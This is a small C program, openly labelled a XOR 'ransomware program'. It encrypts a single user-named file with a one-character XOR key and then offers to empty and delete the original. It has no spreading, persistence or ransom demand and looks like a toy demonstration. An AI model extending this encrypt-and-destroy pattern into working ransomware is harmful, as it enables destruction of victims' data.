#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

char confirm;

void loadingEffect()
{
    printf("Encrypting file");
    fflush(stdout);
    for (int i = 0; i < 3; i++)
    {
        printf(".");
        fflush(stdout);
        sleep(1);
    }
    printf("\n");
}

int main()
{
    FILE *inFile, *outFile;
    char inputFileName[100], outputFileName[100];
    char key;
    int ch;

    printf(
        "  _____                                                        __   ____  \n"
        " |  __ \\                                                       \\ \\ / /_ | \n"
        " | |__) |__ _ _ __  ___  ___  _ __ _____      ____ _ _ __ ___   \\ V / | | \n"
        " |  _  // _` | '_ \\/ __|/ _ \\| '_ ` _ \\ \\ /\\ / / _` | '__/ _ \\   > <  | | \n"
        " | | \\ \\ (_| | | | \\__ \\ (_) | | | | | \\ V  V / (_| | | |  __/  / . \\ | | \n"
        " |_|  \\_\\__,_|_| |_|___/\\___/|_| |_| |_|\\_/\\_/ \\__,_|_|  \\___| /_/ \\_\\|_| \n"
        "\n"
        "\033[1;31m                      Ransomware Program [XOR]\033[0m\n");

    printf("\033[1;36mEnter input file name: \033[0m");
    scanf("%99s", inputFileName);

    printf("\033[1;36mEnter output file name: \033[0m");
    scanf("%99s", outputFileName);

    printf("\033[1;32mEnter single-character encryption key: \033[0m");
    scanf(" %c", &key);

    inFile = fopen(inputFileName, "rb");
    if (inFile == NULL)
    {
        perror("\033[1;31mError opening input file\033[0m");
        return 1;
    }

    outFile = fopen(outputFileName, "wb");
    if (outFile == NULL)
    {
        perror("\033[1;31mError opening output file\033[0m");
        fclose(inFile);
        return 1;
    }

    while ((ch = fgetc(inFile)) != EOF)
    {
        fputc(ch ^ key, outFile);
    }

    fclose(inFile);

    fclose(outFile);

    loadingEffect();

    system("cls");

    printf("Done! File Encrypted with XOR key \033[32m'%c'\033[0m.\n", key);

    // clear
    printf("Do you want to \033[1;33mclear\033[0m the original file contents? (y/n): ");

    scanf(" %c", &confirm);

    if (confirm == 'y' || confirm == 'Y')
    {
        FILE *clearFile = fopen(inputFileName, "w");
        if (clearFile == NULL)
        {
            perror("\033[1;31mError opening file to clear\033[0m");
        }
        else
        {
            fclose(clearFile);
            printf("\033[1;32mFile contents erased successfully!\033[0m\n");
        }
    }
    else if (confirm == 'n' || confirm == 'N')
    {
        printf("File contents unchanged.\n");
    }
    else
    {
        printf("\033[1;31mInvalid input. Skipping file clearing.\033[0m\n");
    }

    // delete
    printf("Do you want to \033[1;31mdelete\033[0m the original file? (y/n): ");
    scanf(" %c", &confirm);

    if (confirm == 'y' || confirm == 'Y')
    {
        if (remove(inputFileName) == 0)
            printf("\033[1;32mOriginal file deleted successfully.\033[0m\n");
        else
            perror("\033[1;31mError deleting original file\033[0m");
    }
    else if (confirm == 'n' || confirm == 'N')
    {
        printf("Original file not deleted.\n");
    }
    else
    {
        printf("\033[1;31mInvalid input. File was not deleted.\033[0m\n");
    }

    return 0;
}
